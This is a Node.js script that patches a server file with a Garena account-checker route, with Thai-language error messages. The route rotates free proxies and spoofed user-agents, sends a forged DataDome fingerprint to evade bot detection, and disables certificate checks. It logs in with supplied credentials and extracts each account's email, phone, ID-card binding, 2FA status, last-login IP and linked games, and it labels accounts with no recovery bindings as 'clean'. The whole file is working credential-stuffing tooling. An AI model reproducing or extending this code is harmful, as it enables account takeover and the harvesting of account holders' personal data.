import fs from 'fs';

let code = fs.readFileSync('server.ts', 'utf8');

const anchorStartRegex = /const jar = new CookieJar\(\);\s*\/\/\s*User-Agent Pool for basic rotation/;
// Find exactly where the block starts
let startIndex = code.search(/const jar = new CookieJar\(\);/);
if (startIndex === -1) {
    console.error("Could not find start index");
    process.exit(1);
}

// Find exactly where the block ends which is `return res.json({ success: false, error: errorMsg, isProxyError: true });\n    }\n  });`
const anchorEndRegex = /return res\.json\(\{\s*success:\s*false,\s*error:\s*errorMsg,\s*isProxyError:\s*true\s*\}\);\s*\}\s*\}\);/;
const match = code.match(anchorEndRegex);
if (!match) {
    console.error("Could not find end index");
    process.exit(1);
}
let endIndex = match.index! + match[0].length;

const snippet = `
    const jar = new CookieJar();
    
    // User-Agent Pool for basic rotation
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    ];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const isEdge = randomUserAgent.includes('Edg/');
    const isMac = randomUserAgent.includes('Mac OS');
    const chromeVer = randomUserAgent.match(/Chrome\\/(\\d+)\\./)?.[1] || '130';
    
    let secChUa = isEdge 
      ? \`"Chromium";v="\${chromeVer}", "Microsoft Edge";v="\${chromeVer}", "Not?A_Brand";v="99"\`
      : \`"Chromium";v="\${chromeVer}", "Google Chrome";v="\${chromeVer}", "Not?A_Brand";v="99"\`;
    let secChPlatform = isMac ? '"macOS"' : '"Windows"';

    // Wait for proxies
    if (freeProxies.length === 0) {
      await fetchFreeProxies();
    }

    let proxyUrl = '';
    const availableProxies = [];
    if (siteSettings.proxies && Array.isArray(siteSettings.proxies) && siteSettings.proxies.length > 0) {
      availableProxies.push(...siteSettings.proxies);
    }
    
    if (siteSettings.auto_proxy !== false && freeProxies.length > 0) {
      availableProxies.push(...freeProxies);
    } else if (!siteSettings.proxies || siteSettings.proxies.length === 0) {
      availableProxies.push(...freeProxies);
    }
    
    if (availableProxies.length > 0) {
      proxyUrl = availableProxies[Math.floor(Math.random() * availableProxies.length)];
    }
    
    let agent;
    try {
      if (proxyUrl) {
        agent = new HttpsProxyAgent(proxyUrl, { timeout: 10000, rejectUnauthorized: false } as any);
      } else {
        agent = new https.Agent({ rejectUnauthorized: false });
      }
    } catch (err) {
      agent = new https.Agent({ rejectUnauthorized: false });
    }

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000); 

    res.on('finish', () => clearTimeout(timeoutId));
    res.on('close', () => clearTimeout(timeoutId));

    const axiosConfig: any = { 
      headers: {
        'User-Agent': randomUserAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
        'Referer': 'https://sso.garena.com/'
      },
      httpsAgent: agent,
      httpAgent: agent,
      proxy: false,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: (status: number) => status < 500
    };
    
    const { wrapper } = await import('axios-cookiejar-support');
    let client = wrapper(axios.create(axiosConfig));
    client.defaults.jar = jar;

    const setupFallbackClient = () => {
       const directAgent = new https.Agent({ rejectUnauthorized: false });
       const fbClient = wrapper(axios.create({ ...axiosConfig, httpsAgent: directAgent, httpAgent: directAgent }));
       fbClient.defaults.jar = jar;
       return fbClient;
    };

    try {
      const getDatadomeCookie = async (httpClient: any) => {
        const url = 'https://dd.garena.com/js/';
        const headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://account.garena.com',
            'pragma': 'no-cache',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': randomUserAgent
        };

        const jsDataPayload = {
            "ttst": 76.70000004768372, "ifov": false, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": randomUserAgent, "wbd": false, "dp0": true, "tagpu": 5.738121195951787, "wdif": false, "wdifrm": false, "npmtm": false, "br_h": 738, "br_w": 260, "isf": false, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": false, "nm": false, "jsf": false, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": true, "str_ls": true, "str_idb": true, "str_odb": false, "plgod": false, "plg": 5, "plgne": true, "plgre": true, "plgof": false, "plggt": false, "pltod": false, "hcovdr": false, "hcovdr2": false, "plovdr": false, "plovdr2": false, "ftsovdr": false, "ftsovdr2": false, "lb": false, "eva": 33, "lo": false, "ts_mtp": 0, "ts_tec": false, "ts_tsa": false, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": false, "awe": false, "geb": false, "dat": false, "med": "defined", "aco": "probably", "acots": false, "acmp": "probably", "acmpts": true, "acw": "probably", "acwts": false, "acma": "maybe", "acmats": false, "acaa": "probably", "acaats": true, "ac3": "", "ac3ts": false, "acf": "probably", "acfts": false, "acmp4": "maybe", "acmp4ts": false, "acmp3": "probably", "acmp3ts": false, "acwm": "maybe", "acwmts": false, "ocpt": false, "vco": "", "vcots": false, "vch": "probably", "vchts": true, "vcw": "probably", "vcwts": true, "vc3": "maybe", "vc3ts": false, "vcmp": "", "vcmpts": false, "vcq": "maybe", "vcqts": false, "vc1": "probably", "vc1ts": true, "dvm": 8, "sqt": false, "so": "landscape-primary", "bda": false, "wdw": true, "prm": true, "tzp": true, "cvs": true, "usb": true, "cap": true, "tbf": false, "lgs": true, "tpd": true
        };

        const payload = {
            'jsData': JSON.stringify(jsDataPayload),
            'eventCounters': '[]',
            'jsType': 'ch',
            'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
            'ddk': 'AE3F04AD3F0D3A462481A337485081',
            'Referer': 'https://account.garena.com/',
            'request': '/',
            'responsePage': 'origin',
            'ddv': '4.35.4'
        };

        const dataParams = new URLSearchParams();
        for (const key in payload) {
            dataParams.append(key, payload[key as keyof typeof payload]);
        }

        const ddRes = await httpClient.post(url, dataParams.toString(), { headers, timeout: 10000 });
        if (ddRes.data && typeof ddRes.data === 'string') {
          try {
             return JSON.parse(ddRes.data);
          } catch(e){}
        }
        return ddRes.data;
      };

      let ddJson = await getDatadomeCookie(client);
      let activeClient = client;

      if (!ddJson || !ddJson.cookie || ddJson.status === 403) {
        console.log(\`Proxy failed DataDome. Using direct connection for DataDome...\`);
        activeClient = setupFallbackClient();
        ddJson = await getDatadomeCookie(activeClient);
      }

      if (ddJson && ddJson.cookie) {
        const datadomeValue = ddJson.cookie.split(';')[0];
        await jar.setCookie(datadomeValue, 'https://sso.garena.com');
      }

      const preloginHeaders = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'connection': 'keep-alive',
            'host': 'sso.garena.com',
            'referer': \`https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=\${account}\`,
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': randomUserAgent
      };

      let preloginRes = await activeClient.get('https://sso.garena.com/api/prelogin', {
          params: { 'app_id': '10100', 'account': account, 'format': 'json', 'id': Date.now().toString() },
          headers: preloginHeaders
      });

      if (preloginRes.status === 403 && activeClient === client) {
         console.log(\`Proxy blocked at Prelogin. Switching to Direct...\`);
         activeClient = setupFallbackClient();
         ddJson = await getDatadomeCookie(activeClient);
         if (ddJson && ddJson.cookie) {
           await jar.setCookie(ddJson.cookie.split(';')[0], 'https://sso.garena.com');
         }
         preloginRes = await activeClient.get('https://sso.garena.com/api/prelogin', {
            params: { 'app_id': '10100', 'account': account, 'format': 'json', 'id': Date.now().toString() },
            headers: preloginHeaders
         });
      }

      if (preloginRes.status === 403) {
         return res.json({ success: false, error: 'ระบบโดนจำกัดการเข้าถึง (403 Forbidden)' });
      }

      const preData = preloginRes.data;
      if (preData.error) {
         return res.json({ success: false, error: \`Prelogin: \${preData.error}\` });
      }
      if (!preData.v1 || !preData.v2) {
         return res.json({ success: false, error: 'ระบบตรวจพบโปรแกรมอัตโนมัติ (DataDome / Captcha).' });
      }

      const hashed_password = encryptPassword(password, preData.v1, preData.v2);
      const loginParams = {
          'app_id': '10100',
          'account': account,
          'password': hashed_password,
          'redirect_uri': 'https://account.garena.com/',
          'format': 'json',
          'id': Date.now().toString()
      };

      const loginRes = await activeClient.get('https://sso.garena.com/api/login', {
         params: loginParams,
         headers: {
            'accept': 'application/json, text/plain, */*',
            'referer': 'https://account.garena.com/',
            'user-agent': randomUserAgent
         }
      });

      const loginData = loginRes.data;
      if (loginData.error) {
        const errorMsg = loginData.error === 'error_auth' ? 'รหัสผ่านผิด' : 
                         loginData.error.includes('captcha') ? 'ต้องแก้ Captcha (Garena Login)' :
                         loginData.error === 'error_not_exist' ? 'ไม่พบไอดีนี้' : 
                         loginData.error;
        return res.json({ success: false, error: errorMsg });
      }

      // Fetch Account Details
      const initRes = await activeClient.get('https://account.garena.com/api/account/init', {
        headers: { 
          'accept': '*/*',
          'referer': 'https://account.garena.com/',
          'user-agent': randomUserAgent
        }
      });
      
      const resData = initRes.data || {};
      const userData = resData.user_info || resData || {};
      
      let fbLinked = false;
      let fbUsername = 'N/A';
      let fbUid = 'N/A';
      
      const fbAccount = userData.fb_account;
      if (fbAccount) {
         if (typeof fbAccount === 'object') {
             fbUsername = fbAccount.name || 'N/A';
             fbUid = fbAccount.id || 'N/A';
         } else if (typeof fbAccount === 'string' && fbAccount !== 'Not Set') {
             try {
                const parsed = JSON.parse(fbAccount);
                fbUsername = parsed.name || parsed.fb_username || 'N/A';
                fbUid = parsed.id || parsed.fb_uid || 'N/A';
             } catch(e) {
                fbUsername = fbAccount;
             }
         }
         fbLinked = true;
      }
      if (userData.is_fbconnect_enabled) fbLinked = true;

      const binds = [];
      if (userData.email && userData.email !== 'N/A' && !userData.email.startsWith('***') && userData.email.includes('@')) binds.push('Email');
      if (userData.mobile_no && userData.mobile_no !== 'N/A' && String(userData.mobile_no).trim()) binds.push('Phone');
      if (fbLinked) binds.push('Facebook');
      if (userData.idcard && userData.idcard !== 'N/A' && String(userData.idcard).trim()) binds.push('ID Card');
      
      const isClean = binds.length === 0;

      const [codmInfo, gameConnections] = await Promise.all([
        getCodmInfo(activeClient).catch(() => null),
        getGameConnections(activeClient).catch(() => [])
      ]);

      const rovGames = (gameConnections || []).filter((g: string) => g.toUpperCase().includes('ROV'));
      const hasRov = rovGames.length > 0;
      let rovCharacter = 'N/A';
      if (hasRov) {
        try {
          const cleanName = rovGames[0].replace('[', '').replace(']', '');
          const parts = cleanName.split('-');
          if (parts.length > 2) rovCharacter = parts[2].trim();
        } catch(e) {}
      }
      const phoneBound = !!(userData.mobile_no && userData.mobile_no !== 'N/A');
      const emailVerified = !!userData.email_v;
      const rovClean = hasRov && !emailVerified && !phoneBound;
      const hasCodm = codmInfo != null && codmInfo.level !== 'Unknown';

      // Ensure last login handles timestamps correctly
      let lastLoginDateFormatted = 'N/A';
      const lastHist = resData.login_history?.[0];
      if (lastHist?.timestamp) {
         lastLoginDateFormatted = new Date(lastHist.timestamp * 1000).toLocaleString('en-US', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
      } else if (userData.last_login?.time) {
         lastLoginDateFormatted = new Date(userData.last_login.time * 1000).toLocaleString('en-US', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
      }

      let avatarUrl = 'N/A';
      if (userData.avatar && userData.avatar !== 'N/A') {
          avatarUrl = userData.avatar.startsWith('http') ? userData.avatar : \`https://account.garena.com/static/\${userData.avatar}\`;
      }

      return res.json({
        success: true,
        data: {
          account, password, uid: userData.uid || 'N/A',
          shells: userData.shell || 0,
          level: codmInfo?.level || 0, 
          rank: 'Success', 
          isClean,
          phoneBound,
          emailVerified,
          fbLinked,
          region: userData.acc_country || 'TH',
          otherGames: gameConnections || [],
          codmNickname: codmInfo?.nickname || 'N/A',
          codmUid: codmInfo?.uid || 'N/A',
          codmOpenId: codmInfo?.open_id || 'N/A',
          codmTOpenId: codmInfo?.t_open_id || 'N/A',
          codmRegion: codmInfo?.region || 'N/A',
          codmRegionName: codmInfo?.region_name || 'Unknown',
          codmRegionFlag: codmInfo?.region_flag || '🏳️',
          idCardBound: !!(userData.idcard && userData.idcard !== 'N/A'),
          hasRov,
          rovCharacter,
          rovClean,
          hasCodm,
          avatarUrl,
          mobileNumber: userData.mobile_no || 'N/A',
          emailAddress: userData.email || 'N/A',
          fbUsername,
          twoFaEnabled: !!userData.two_step_verify_enable,
          authenticatorEnabled: !!userData.authenticator_enable,
          lastLoginDate: lastLoginDateFormatted,
          lastLoginIp: lastHist?.ip || userData.last_login?.ip || 'N/A',
          lastLoginCountry: lastHist?.country || userData.last_login?.country || 'N/A',
          lastLoginSource: lastHist?.source || userData.last_login?.source || 'Unknown'
        }
      });

    } catch (err: any) {
      const errMsg = err?.message || '';
      console.error("Garena API Error:", errMsg || err);
      let errorMsg = 'Network Error: ' + (errMsg || 'Unknown Error');
      
      if (err?.code === 'ECONNABORTED' || errMsg.includes('timeout') || err?.code === 'ETIMEDOUT') {
        errorMsg = 'การเชื่อมต่อถูกยกเลิก (ใช้เวลาเกิน). Proxy ช้าเกินไป หรือค้าง';
      } else if (err?.name === 'AbortError' || err?.code === 'ERR_CANCELED' || err?.name === 'CanceledError' || errMsg === 'canceled') {
        errorMsg = 'การเชื่อมต่อถูกยกเลิก (ใช้เวลาเกิน). Proxy ช้าเกินไป หรือค้าง';
      } else if (err?.code === 'ECONNRESET') {
        errorMsg = 'การเชื่อมต่อถูกตัด (ECONNRESET)';
      } else if (errMsg.includes('disconnected') || errMsg.includes('TLS')) {
        errorMsg = 'เชื่อมต่อไม่ปลอดภัย (TLS Error/Blocked)';
      } else if (err?.code === 'ECONNREFUSED' || errMsg.includes('ECONNREFUSED')) {
        errorMsg = 'เซิร์ฟเวอร์ Proxy ออฟไลน์';
      } else if (errMsg.includes('CONNECT response')) {
        errorMsg = 'Proxy หมดอายุหรือถูกแบน';
      }
      
      return res.json({ success: false, error: errorMsg, isProxyError: true });
    }
  });`;

const newCode = code.substring(0, startIndex) + snippet + code.substring(endIndex);
fs.writeFileSync('server.ts', newCode);
console.log('Successfully replaced check route!');
